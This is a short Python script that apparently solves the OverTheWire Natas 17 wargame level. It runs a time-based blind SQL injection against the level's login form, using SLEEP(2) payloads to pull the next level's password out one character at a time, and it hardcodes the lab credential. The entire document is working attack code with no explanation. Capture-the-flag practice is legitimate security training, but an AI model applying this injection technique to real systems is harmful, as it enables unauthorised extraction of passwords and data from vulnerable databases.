import requests
import string
import time

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = 'http://{}.natas.labs.overthewire.org'.format(username)

def blind_time_sql(payload):
    data = {
        'username': payload
    }
    now = time.time()
    response = requests.post(url, auth = (username, password), data = data)
    current = time.time()
    return current - now > 2.0

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits

final_password = ''

for iteration in range(40):
    for char in alphabet:
        current_password = final_password + char
        payload = 'natas18" AND BINARY password LIKE "{}%" AND SLEEP(2)#'.format(current_password)
        if blind_time_sql(payload):
            final_password = current_password
            print(final_password)
            break
